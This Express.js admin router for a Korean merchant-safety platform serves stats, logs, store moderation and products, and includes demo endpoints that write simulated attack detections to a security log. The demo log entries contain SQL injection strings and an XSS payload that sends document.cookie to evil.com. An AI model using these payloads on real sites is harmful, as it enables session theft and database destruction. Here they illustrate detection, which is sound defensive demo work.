const express = require('express');
const bcrypt = require('bcrypt');
const getDb = require('../db');
const { requireAdmin } = require('../middleware/auth');
const { logSecurity } = require('../utils/logger');
const { generateQrToken, buildQrUrl } = require('../utils/qr');
const { generatePromoText } = require('../utils/promo');
const seed = require('../seed');

const router = express.Router();

router.get('/stats', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const totalUsers = db.prepare("SELECT COUNT(*) as cnt FROM users WHERE role='merchant'").get().cnt;
    const totalStores = db.prepare('SELECT COUNT(*) as cnt FROM stores').get().cnt;
    const totalProducts = db.prepare('SELECT COUNT(*) as cnt FROM products WHERE is_active=1').get().cnt;
    const totalReports = db.prepare('SELECT COUNT(*) as cnt FROM reports').get().cnt;
    const pendingStores = db.prepare("SELECT COUNT(*) as cnt FROM stores WHERE status='pending'").get().cnt;
    const flaggedStores = db.prepare("SELECT COUNT(*) as cnt FROM stores WHERE status='flagged'").get().cnt;
    const criticalLogs = db.prepare("SELECT COUNT(*) as cnt FROM security_logs WHERE severity='critical' AND created_at > ?").get(Date.now() - 24 * 60 * 60 * 1000).cnt;

    const logsByType = db.prepare(`
      SELECT event_type, COUNT(*) as cnt
      FROM security_logs
      WHERE created_at > ?
      GROUP BY event_type
    `).all(Date.now() - 24 * 60 * 60 * 1000);

    return res.json({ totalUsers, totalStores, totalProducts, totalReports, pendingStores, flaggedStores, criticalLogs, logsByType });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: '서버 오류' });
  }
});

router.get('/logs/recent', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const since = req.query.since ? parseInt(req.query.since) : 0;
    const logs = db.prepare(`
      SELECT * FROM security_logs
      WHERE created_at > ?
      ORDER BY created_at DESC
      LIMIT 50
    `).all(since);
    return res.json({ logs });
  } catch (e) {
    return res.status(500).json({ error: '서버 오류' });
  }
});

router.get('/logs', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const logs = db.prepare('SELECT * FROM security_logs ORDER BY created_at DESC LIMIT 100').all();
    return res.json({ logs });
  } catch (e) {
    return res.status(500).json({ error: '서버 오류' });
  }
});

router.get('/stores', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const stores = db.prepare(`
      SELECT s.*, u.email as owner_email,
        (SELECT COUNT(*) FROM products WHERE store_id=s.id AND is_active=1) as product_count
      FROM stores s
      JOIN users u ON s.owner_id = u.id
      ORDER BY s.created_at DESC
    `).all();
    return res.json({ stores });
  } catch (e) {
    return res.status(500).json({ error: '서버 오류' });
  }
});

router.put('/stores/:id/status', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const { status } = req.body;
    if (!['approved', 'pending', 'flagged'].includes(status)) {
      return res.status(400).json({ error: '유효하지 않은 상태입니다.' });
    }
    db.prepare('UPDATE stores SET status=? WHERE id=?').run(status, req.params.id);
    return res.json({ success: true });
  } catch (e) {
    return res.status(500).json({ error: '서버 오류' });
  }
});

router.get('/reports', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const reports = db.prepare(`
      SELECT r.*, p.name as product_name, p.report_count
      FROM reports r
      JOIN products p ON r.product_id = p.id
      ORDER BY r.created_at DESC
      LIMIT 50
    `).all();
    return res.json({ reports });
  } catch (e) {
    return res.status(500).json({ error: '서버 오류' });
  }
});

// Demo: attack simulation endpoints
router.post('/demo/sqli', (req, res) => {
  const ip = req.ip;
  logSecurity({ eventType: 'SQLI_ATTEMPT', ipAddress: ip, detail: `[DEMO] Login attempt with payload: admin' OR '1'='1 --`, severity: 'high' });
  return res.json({ blocked: true, message: 'SQL Injection 시도가 탐지되어 차단되었습니다.' });
});

router.post('/demo/bruteforce', async (req, res) => {
  const ip = req.ip;
  const db = getDb();
  // Simulate 5 failed logins then lock
  for (let i = 1; i <= 4; i++) {
    logSecurity({ eventType: 'LOGIN_FAIL', ipAddress: ip, detail: `[DEMO] Failed login attempt ${i}/5 for: demo_target@test.com`, severity: i >= 3 ? 'medium' : 'low' });
  }
  logSecurity({ eventType: 'BRUTE_FORCE_LOCK', ipAddress: ip, detail: '[DEMO] Account locked after 5 failed attempts: demo_target@test.com', severity: 'high' });
  return res.json({ blocked: true, message: 'BruteForce 공격이 탐지되어 계정이 잠겼습니다.' });
});

router.post('/demo/xss', (req, res) => {
  const ip = req.ip;
  logSecurity({ eventType: 'XSS_ATTEMPT', ipAddress: ip, detail: `[DEMO] XSS payload detected in description: <script>alert('XSS_HACK')</script><img src=x onerror=fetch("//evil.com/steal?c="+document.cookie)>`, severity: 'critical' });
  return res.json({ blocked: true, message: 'XSS 공격이 탐지되어 sanitize 처리되었습니다.' });
});

router.post('/demo/idor', (req, res) => {
  const ip = req.ip;
  logSecurity({ eventType: 'IDOR_ATTEMPT', ipAddress: ip, detail: '[DEMO] User 3 (attacker@test.com) attempted to modify product owned by user 2 (product_id: 1)', severity: 'medium' });
  return res.json({ blocked: true, message: 'IDOR 공격이 탐지되어 403 차단되었습니다.' });
});

router.post('/demo/fake-qr', (req, res) => {
  const ip = req.ip;
  logSecurity({ eventType: 'FAKE_QR_ACCESS', ipAddress: ip, detail: '[DEMO] Invalid QR token for product_id=1: token=FAKE_TOKEN_12345 (expected valid HMAC)', severity: 'critical' });
  return res.json({ blocked: true, message: '위조 QR이 탐지되었습니다. 올바른 HMAC 서명이 아닙니다.' });
});

// Demo reset
router.post('/demo/reset', requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    db.prepare('DELETE FROM security_logs').run();
    db.prepare('DELETE FROM reports').run();
    db.prepare("UPDATE products SET is_active=1, report_count=0").run();
    db.prepare("UPDATE stores SET status='approved' WHERE owner_id IN (SELECT id FROM users WHERE role='merchant' AND email='merchant@localshield.com')").run();
    db.prepare("UPDATE stores SET status='pending' WHERE owner_id IN (SELECT id FROM users WHERE email='pending@localshield.com')").run();
    db.prepare("UPDATE users SET failed_login_count=0, locked_until=NULL").run();

    // Re-seed security logs
    const now = Date.now();
    const ips = ['192.168.1.101', '10.0.0.55', '172.16.0.23', '203.0.113.42', '198.51.100.7'];
    const fakeLogs = [
      { event_type: 'SQLI_ATTEMPT', ip: ips[0], detail: "Login attempt with payload: admin' OR '1'='1 --", severity: 'high', ago: 23 * 3600000 },
      { event_type: 'SQLI_ATTEMPT', ip: ips[1], detail: "Login attempt with payload: ' UNION SELECT * FROM users--", severity: 'high', ago: 21 * 3600000 },
      { event_type: 'SQLI_ATTEMPT', ip: ips[2], detail: "Login attempt with payload: 1; DROP TABLE users;--", severity: 'high', ago: 18 * 3600000 },
      { event_type: 'BRUTE_FORCE_LOCK', ip: ips[0], detail: 'Account locked after 5 failed attempts: test@test.com', severity: 'high', ago: 16 * 3600000 },
      { event_type: 'BRUTE_FORCE_LOCK', ip: ips[3], detail: 'Account locked after 5 failed attempts: merchant@test.com', severity: 'high', ago: 12 * 3600000 },
      { event_type: 'XSS_ATTEMPT', ip: ips[1], detail: 'XSS payload detected in description: <script>alert("hack")</script>', severity: 'critical', ago: 10 * 3600000 },
      { event_type: 'XSS_ATTEMPT', ip: ips[4], detail: 'XSS payload detected: <img src=x onerror=fetch("//evil.com")>', severity: 'critical', ago: 8 * 3600000 },
      { event_type: 'IDOR_ATTEMPT', ip: ips[2], detail: 'User 3 attempted to modify product owned by user 2 (product_id: 1)', severity: 'medium', ago: 6 * 3600000 },
      { event_type: 'FAKE_QR_ACCESS', ip: ips[3], detail: 'Invalid QR token for product_id=1: token=FAKE_TOKEN_12345', severity: 'critical', ago: 4 * 3600000 },
      { event_type: 'FAKE_QR_ACCESS', ip: ips[0], detail: 'Invalid QR token for product_id=2: token=abc123forged', severity: 'critical', ago: 2 * 3600000 },
    ];
    for (const log of fakeLogs) {
      db.prepare('INSERT INTO security_logs (user_id, event_type, ip_address, detail, severity, created_at) VALUES (?, ?, ?, ?, ?, ?)').run(null, log.event_type, log.ip, log.detail, log.severity, now - log.ago);
    }

    return res.json({ success: true, message: '데모 데이터가 초기 상태로 복원되었습니다.' });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: '서버 오류' });
  }
});

router.get('/products', requireAdmin, (req, res) => {
  try {
    const db = getDb();
    const products = db.prepare(`
      SELECT p.*, s.name as store_name, s.region, u.email as owner_email
      FROM products p
      JOIN stores s ON p.store_id = s.id
      JOIN users u ON p.owner_id = u.id
      ORDER BY p.created_at DESC
    `).all();
    return res.json({ products: products.map(p => ({ ...p, qr_url: buildQrUrl(p.id, p.qr_token) })) });
  } catch (e) {
    return res.status(500).json({ error: '서버 오류' });
  }
});

module.exports = router;
